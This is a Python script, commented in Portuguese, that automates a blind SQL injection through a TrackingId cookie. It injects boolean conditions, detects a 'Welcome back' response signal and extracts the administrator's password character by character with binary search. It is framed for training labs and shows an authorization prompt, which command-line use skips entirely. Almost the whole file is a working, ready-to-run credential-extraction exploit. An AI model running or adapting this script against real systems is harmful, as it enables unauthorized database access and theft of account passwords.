#!/data/data/com.termux/files/usr/bin/python
"""
Blind SQLi Extractor v2.1 — FULL AUTO, single-session
Pega TrackingId, detecta sinal, extrai senha — tudo numa sessão.
Authorized labs only.
"""

import requests
import sys
import time
import argparse
import re

CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"

GREEN = '\033[0;32m'
RED = '\033[0;31m'
YELLOW = '\033[1;33m'
CYAN = '\033[0;36m'
MAGENTA = '\033[0;35m'
GRAY = '\033[0;90m'
BOLD = '\033[1m'
NC = '\033[0m'


class Engine:
    def __init__(self, url):
        self.url = url if url.endswith('/') else url + '/'
        self.s = requests.Session()
        self.s.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.tid = None
        self.signal = None
        self.nreq = 0

    def setup(self):
        """Pega TrackingId e valida sinal NA MESMA SESSÃO"""
        print(f"{CYAN}[*] Conectando e pegando TrackingId...{NC}")
        r = self.s.get(self.url, timeout=15)
        self.nreq += 1
        self.tid = self.s.cookies.get('TrackingId')
        if not self.tid:
            print(f"{RED}[-] Sem TrackingId no Set-Cookie. Lab no ar?{NC}")
            return False
        print(f"{GREEN}[+] TrackingId: {self.tid}{NC}")

        # Baseline — sessão já registrada deve ter o sinal
        r = self.s.get(self.url, timeout=15)
        self.nreq += 1
        if 'Welcome back' not in r.text:
            print(f"{RED}[-] Baseline sem 'Welcome back' — lab não é conditional responses?{NC}")
            return False
        self.signal = 'Welcome back'
        print(f"{GREEN}[+] Sinal: 'Welcome back' (por sessão){NC}")
        return True

    def test(self, condition):
        """Injeta condição no cookie, header CRU (mesma sessão)"""
        self.nreq += 1
        try:
            r = self.s.get(self.url,
                          headers={'Cookie': f"TrackingId={self.tid}' AND {condition}--"},
                          timeout=15)
            return self.signal in r.text
        except requests.exceptions.RequestException:
            return False

    def password_length_is(self, n):
        return self.test(
            f"(SELECT LENGTH(password) FROM users WHERE username='administrator')={n}")

    def char_at_is(self, pos, c):
        return self.test(
            f"(SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{c}'")

    def char_at_greater(self, pos, c):
        return self.test(
            f"(SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')>'{c}'")


def find_length(e, max_len=50):
    print(f"{CYAN}[*] Detectando comprimento da senha...{NC}")
    for n in range(1, max_len + 1):
        if e.password_length_is(n):
            print(f"{GREEN}[+] {n} caracteres ({e.nreq} requests){NC}")
            return n
    print(f"{RED}[-] Não achou até {max_len}{NC}")
    return None


def binary_char(e, pos, charset):
    candidates = sorted(charset)
    while len(candidates) > 1:
        mid = len(candidates) // 2
        pivot = candidates[mid]
        if e.char_at_greater(pos, pivot):
            candidates = candidates[mid+1:]
        else:
            if e.char_at_is(pos, pivot):
                return pivot
            candidates = candidates[:mid]
    return candidates[0] if candidates else None


def linear_char(e, pos, charset):
    for c in charset:
        if e.char_at_is(pos, c):
            return c
    return None


def extract(e, length, charset):
    print(f"\n{CYAN}[*] Extraindo ({length} chars, busca binária)...{NC}")
    password = ""
    start = time.time()
    for pos in range(1, length + 1):
        c = binary_char(e, pos, charset)
        if c is None:
            c = linear_char(e, pos, charset)
        if c is None:
            print(f"\n{RED}[!] Pos {pos} falhou.{NC}")
            break
        password += c
        el = time.time() - start
        rate = e.nreq / el if el else 0
        print(f"\r  {GREEN}[{pos}/{length}]{NC} {BOLD}{password}{NC}"
              f"{GRAY} {'█'*pos}{'░'*(length-pos)} ({e.nreq} req, {rate:.1f}/s){NC}",
              end="", flush=True)
    print()
    print(f"{GREEN}[✓] {time.time()-start:.1f}s, {e.nreq} requests{NC}")
    return password


AUTH_BANNER = f"""
{RED}╔══════════════════════════════════════════════════╗
║          AUTORIZAÇÃO OBRIGATÓRIA                 ║
╠══════════════════════════════════════════════════╣
║  [1] Lab de treino (PortSwigger/HTB/THM)         ║
║  [2] Sistema próprio                             ║
║  [3] Pentest com contrato                        ║
║  [0] CANCELAR                                    ║
╚══════════════════════════════════════════════════╝{NC}
"""


def run(url):
    print(f"{MAGENTA}")
    print("  ╔══════════════════════════════════════╗")
    print("  ║   👁  BLIND SQLI v2.1 — FULL AUTO    ║")
    print("  ║   single-session · binary search     ║")
    print("  ╚══════════════════════════════════════╝")
    print(f"{NC}")

    e = Engine(url)
    if not e.setup():
        sys.exit(1)

    length = find_length(e)
    if not length:
        sys.exit(1)

    password = extract(e, length, CHARSET)
    if password:
        print(f"\n{GREEN}{'═'*50}{NC}")
        print(f"  {BOLD}SENHA: {password}{NC}")
        print(f"  User: administrator | Requests: {e.nreq}")
        print(f"{GREEN}{'═'*50}{NC}")
        print(f"\n{CYAN}→ Loga com administrator + senha pra resolver.{NC}")


def main():
    if len(sys.argv) == 1:
        print(f"{MAGENTA}")
        print("  ╔══════════════════════════════════════╗")
        print("  ║   👁  BLIND SQLI v2.1 — FULL AUTO    ║")
        print("  ╚══════════════════════════════════════╝")
        print(f"{NC}")
        print(AUTH_BANNER)
        c = input(f"{YELLOW}[?] Autorização: {NC}").strip()
        if c not in ('1', '2', '3'):
            print(f"{RED}[!] Cancelado.{NC}")
            sys.exit(0)
        url = input(f"{YELLOW}[?] URL do lab: {NC}").strip()
        if not url:
            sys.exit(1)
        run(url)
    else:
        ap = argparse.ArgumentParser()
        ap.add_argument('-u', '--url', required=True)
        ap.add_argument('--yes', action='store_true')
        args = ap.parse_args()
        run(args.url)


if __name__ == '__main__':
    main()
